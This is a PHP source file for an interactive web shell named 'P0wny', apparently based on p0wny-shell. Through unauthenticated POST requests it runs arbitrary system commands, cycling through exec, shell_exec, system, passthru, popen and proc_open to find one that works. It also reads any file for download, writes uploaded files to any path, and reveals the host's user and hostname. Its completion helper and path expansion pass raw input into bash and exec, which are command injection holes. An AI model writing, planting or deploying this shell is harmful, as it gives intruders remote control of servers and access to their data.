<?php

declare(strict_types = 1);

namespace Inane\Shell;

use Exception;
use Inane\Http\Response;
use Inane\Stdlib\Exception\BadMethodCallException;
use Inane\Stdlib\Exception\UnexpectedValueException;
use Inane\View\Renderer\PhpRenderer;
use JsonException;
use RuntimeException;

use function array_map;
use function base64_decode;
use function base64_encode;
use function basename;
use function chdir;
use function exec;
use function explode;
use function fclose;
use function feof;
use function file_exists;
use function file_get_contents;
use function fopen;
use function fread;
use function function_exists;
use function fwrite;
use function getcwd;
use function getenv;
use function gethostname;
use function header;
use function implode;
use function is_array;
use function is_dir;
use function is_resource;
use function is_string;
use function json_encode;
use function ob_get_clean;
use function ob_start;
use function passthru;
use function pclose;
use function popen;
use function posix_geteuid;
use function posix_getpwuid;
use function preg_match;
use function proc_close;
use function proc_open;
use function shell_exec;
use function stream_get_contents;
use function stripos;
use function system;

use const DIRECTORY_SEPARATOR;
use const JSON_THROW_ON_ERROR;
use const PHP_EOL;
use const PHP_OS_FAMILY;

$file = __DIR__ . '/' . $_SERVER['REQUEST_URI'];
// Server existing files in web dir
if (file_exists($file) && !is_dir($file)) return false;

if (file_exists(getcwd() . DIRECTORY_SEPARATOR . 'vendor' . DIRECTORY_SEPARATOR . 'autoload.php')) {
    $autoload = getcwd() . DIRECTORY_SEPARATOR . 'vendor' . DIRECTORY_SEPARATOR . 'autoload.php';
} elseif (!$autoload = getEnv('ENV_PHP_VENDOR')) {
    echo('No autoload.php file found at ' . getcwd() . DIRECTORY_SEPARATOR . 'vendor' . DIRECTORY_SEPARATOR . 'autoload.php' . PHP_EOL);
    echo('AND' . PHP_EOL);
    echo('Missing environment variable `ENV_PHP_VENDOR` which should point to the php vendor autoload.php file.' . PHP_EOL);
    exit(10);
}

require_once $autoload;

/**
 * Handles the interactive shell page and its JSON feature requests.
 */
final class P0wny {
    /**
     * Configuration settings for the application.
     *
     * This array holds various configuration parameters used throughout the application.
     * It includes essential details such as username, hostname, and version.
     *
     * @var array{username: string, hostname: string, version: string} $config Configuration data with keys: 'username', 'hostname', and 'version'.
     */
    private array $config = [
        'username' => 'p0wny',
        'hostname' => 'shell',
        'version'  => '0.1.0',
    ];

    /**
     * Initialises a new instance of the class with the specified view directory path.
     *
     * @param string $viewDirectory The path to the directory containing view files.
     *
     * @return void This method does not return any value.
     */
    public function __construct(private readonly string $viewDirectory) {}

    /**
     * Handles incoming requests and processes them based on the 'feature' query parameter.
     *
     * If a 'feature' is provided in the GET request, it sends a feature response using the `sendFeatureResponse` method.
     * Otherwise, it initialises the configuration, renders a view using the PhpRenderer class, and sends the rendered HTML
     * as a response using an instance of \Inane\Http\Client.
     *
     * @return void This method does not return any value.
     *
     * @throws BadMethodCallException
     * @throws JsonException
     * @throws UnexpectedValueException
     * @throws \Inane\View\Exception\RuntimeException
     */
    public function handle(): void {
        $feature = $_GET['feature'] ?? null;
        if (is_string($feature)) {
            $this->sendFeatureResponse($feature);

            return;
        }

        $this->initialiseConfig();
        $renderer = new PhpRenderer($this->viewDirectory);
        $html = $renderer->render('p0wny', $this->config);

        new \Inane\Http\Client()->send(new Response($html));
    }

    /**
     * Sends a feature response based on the specified feature.
     *
     * @param string $feature The name of the feature to send a response for.
     */
    private function sendFeatureResponse(string $feature): void {
        $response = match ($feature) {
            'shell' => $this->featureShell(),
            'pwd' => $this->featurePwd(),
            'hint' => $this->featureHint(),
            'upload' => $this->featureUpload(),
            default => null,
        };

        header('Content-Type: application/json');
        echo json_encode($response, JSON_THROW_ON_ERROR);
    }

    /**
     * Executes a shell command based on the provided input.
     *
     * This method handles various commands such as changing directories,
     * downloading files, and executing general shell commands. It ensures that
     * all output is captured and returned in a standardized format.
     *
     * @return array<string, string> An associative array containing base64-encoded 'stdout' and 'cwd'.
     *
     * @throws RuntimeException If the command execution fails or an unexpected error occurs.
     */
    private function featureShell(): array {
        $command = $this->postString('cmd');
        if (!str_contains($command, '2>')) {
            $command .= ' 2>&1';
        }

        $cwd = $this->postString('cwd');
        $stdout = '';

        if (preg_match('/^\s*cd\s*(2>&1)?$/', $command) === 1) {
            $this->changeDirectory($this->expandPath('~'));
        } elseif (preg_match('/^\s*cd\s+([^\s]+)\s*(2>&1)?$/', $command, $matches) === 1) {
            $this->changeDirectory($cwd);
            $this->changeDirectory($this->expandPath($matches[1]));
        } elseif (preg_match('/^\s*download\s+([^\s]+)\s*(2>&1)?$/', $command, $matches) === 1) {
            $this->changeDirectory($cwd);

            return $this->featureDownload($matches[1]);
        } else {
            $this->changeDirectory($cwd);
            $stdout = $this->executeCommand($command);
        }

        return [
            'stdout' => base64_encode($stdout),
            'cwd'    => base64_encode($this->currentDirectory()),
        ];
    }

    /**
     * Retrieves the current working directory and encodes it in base64.
     *
     * @return array{cwd: string} An associative array with a key 'cwd' containing the base64 encoded current working directory.
     *
     * @throws Exception If there is an error retrieving the current working directory.
     */
    private function featurePwd(): array {
        return ['cwd' => base64_encode($this->currentDirectory())];
    }

    /**
     * Generates a list of files or commands that match the given filename hint.
     *
     * This method changes the current working directory based on the 'cwd' parameter,
     * then retrieves a list of files or commands matching the 'filename' parameter.
     * The type of matching is determined by the 'type' parameter, which can be either
     * 'cmd' for command completion or any other value for file completion.
     *
     * @return array{files: list<string>} An associative array with a single key 'files', whose value is an array
     *               of base64 encoded filenames or commands that match the hint.
     *
     * @throws Exception If changing the directory fails or if there is an issue executing the shell command.
     */
    private function featureHint(): array {
        $this->changeDirectory($this->postString('cwd'));
        $fileName = $this->postString('filename');
        $command = $this->postString('type') === 'cmd'
            ? "compgen -c $fileName"
            : "compgen -f $fileName";
        $output = shell_exec("/bin/bash -c \"$command\"") ?? '';
        $files = explode("\n", $output);

        return ['files' => array_map(base64_encode(...), $files)];
    }

    /**
     * Downloads a file from the specified path and returns its contents.
     *
     * @param string $filePath The path to the file to be downloaded.
     *
     * @return array<string, string> An associative array containing the base64-encoded name of the file and its contents,
     *               or an error message if the file cannot be read.
     *
     * @throws Exception Throws an exception if there is an error reading the file.
     */
    private function featureDownload(string $filePath): array {
        $file = @file_get_contents($filePath);
        if ($file === false) {
            return [
                'stdout' => base64_encode('File not found / no read permission.'),
                'cwd'    => base64_encode($this->currentDirectory()),
            ];
        }

        return [
            'name' => base64_encode(basename($filePath)),
            'file' => base64_encode($file),
        ];
    }

    /**
     * Handles file upload by writing the received file data to a specified path.
     *
     * This method changes the current working directory based on the input from `postString('cwd')`.
     * It then attempts to open the file at the path provided by `postString('path')` in write binary mode.
     * If the file cannot be opened or written, it returns an error message. Otherwise, it writes the base64
     * decoded content of `postString('file')` to the file and closes the handle.
     *
     * @return array{stdout: string, cwd: string} An associative array with 'stdout' containing a base64 encoded status message,
     *               and 'cwd' containing the base64 encoded current working directory.
     *
     * @throws Exception If there is an issue with changing directories or handling the file operations.
     */
    private function featureUpload(): array {
        $this->changeDirectory($this->postString('cwd'));
        $handle = @fopen($this->postString('path'), 'wb');
        if ($handle === false) {
            return [
                'stdout' => base64_encode('Invalid path / no write permission.'),
                'cwd'    => base64_encode($this->currentDirectory()),
            ];
        }

        fwrite($handle, base64_decode($this->postString('file')));
        fclose($handle);

        return [
            'stdout' => base64_encode('Done.'),
            'cwd'    => base64_encode($this->currentDirectory()),
        ];
    }

    /**
     * Executes a given shell command and returns the output.
     *
     * @param string $command The shell command to execute.
     *
     * @return string The output of the executed command, or an empty string if no valid execution method is found.
     *
     * @throws \RuntimeException If none of the available command-execution functions are present.
     */
    private function executeCommand(string $command): string {
        if (function_exists('exec')) {
            exec($command, $output);

            return implode("\n", $output);
        }

        if (function_exists('shell_exec')) {
            return shell_exec($command) ?? '';
        }

        if ($this->allFunctionsExist([
            'system',
            'ob_start',
            'ob_get_clean',
        ])) {
            ob_start();
            system($command);

            return ob_get_clean() ?: '';
        }

        if ($this->allFunctionsExist([
            'passthru',
            'ob_start',
            'ob_get_clean',
        ])) {
            ob_start();
            passthru($command);

            return ob_get_clean() ?: '';
        }

        if ($this->allFunctionsExist([
            'popen',
            'feof',
            'fread',
            'pclose',
        ])) {
            $handle = popen($command, 'r');
            if ($handle !== false) {
                $output = '';
                while(!feof($handle)) {
                    $output .= fread($handle, 4096);
                }
                pclose($handle);

                return $output;
            }
        }

        if ($this->allFunctionsExist([
            'proc_open',
            'stream_get_contents',
            'proc_close',
        ])) {
            $process = proc_open($command, [
                0 => [
                    'pipe',
                    'r',
                ],
                1 => [
                    'pipe',
                    'w',
                ],
            ], $pipes);
            if (is_resource($process)) {
                $output = stream_get_contents($pipes[1]);
                fclose($pipes[0]);
                fclose($pipes[1]);
                proc_close($process);

                return $output === false ? '' : $output;
            }
        }

        throw new \RuntimeException('No command-execution function is available.');
    }

    /**
     * Expands a path containing a tilde (~) to the full path.
     *
     * @param string $path The input path that may contain a tilde (~).
     *
     * @return string Returns the expanded path with the home directory replaced by its full path.
     *
     * @throws \RuntimeException If the home directory cannot be expanded.
     */
    private function expandPath(string $path): string {
        if (preg_match('#^(~[a-zA-Z0-9_.-]*)(/.*)?$#', $path, $matches) !== 1) {
            return $path;
        }

        exec("echo $matches[1]", $output);
        if (!isset($output[0])) {
            throw new \RuntimeException('Unable to expand the home directory.');
        }

        return $output[0] . ($matches[2] ?? '');
    }

    /**
     * Changes the current working directory to the specified directory.
     *
     * @param string $directory The path of the directory to change to.
     *
     * @return void This function does not return any value.
     *
     * @throws \RuntimeException Throws a RuntimeException if the directory cannot be changed.
     */
    private function changeDirectory(string $directory): void {
        if (!chdir($directory)) {
            throw new \RuntimeException("Unable to change directory to '$directory'.");
        }
    }

    /**
     * Retrieves the current working directory of the script.
     *
     * @return string The absolute path of the current working directory.
     *
     * @throws \RuntimeException Throws a RuntimeException if unable to determine the current working directory.
     */
    private function currentDirectory(): string {
        $directory = getcwd();
        if ($directory === false) {
            throw new \RuntimeException('Unable to determine the current working directory.');
        }

        return $directory;
    }

    /**
     * Checks if all specified functions exist in the current PHP environment.
     *
     * @param string[] $functions An array of function names to check for existence.
     *
     * @return bool Returns true if all specified functions exist, otherwise false.
     */
    private function allFunctionsExist(array $functions): bool {
        foreach($functions as $function) {
            if (!function_exists($function)) {
                return false;
            }
        }

        return true;
    }

    /**
     * Retrieves a string value from the POST request.
     *
     * @param string $key The key to retrieve the value for.
     *
     * @return string The retrieved string value.
     *
     * @throws \RuntimeException When the specified key is missing or the value is not a string.
     */
    private function postString(string $key): string {
        $value = $_POST[$key] ?? null;
        if (!is_string($value)) {
            throw new \RuntimeException("Missing or invalid '$key' request value.");
        }

        return $value;
    }

    /**
     * Initialises the configuration with a username and hostname based on the operating system.
     *
     * @throws \RuntimeException When unable to determine the username or hostname.
     */
    private function initialiseConfig(): void {
        if (stripos(PHP_OS_FAMILY, 'WIN') === 0) {
            $username = getenv('USERNAME');
            if (is_string($username)) {
                $this->config['username'] = $username;
            }
        } elseif (function_exists('posix_getpwuid') && function_exists('posix_geteuid')) {
            $user = posix_getpwuid(posix_geteuid());
            if (is_array($user) && isset($user['name']) && is_string($user['name'])) {
                $this->config['username'] = $user['name'];
            }
        }

        $hostname = gethostname();
        if (is_string($hostname)) {
            $this->config['hostname'] = $hostname;
        }
    }
}

new P0wny(__DIR__)->handle();
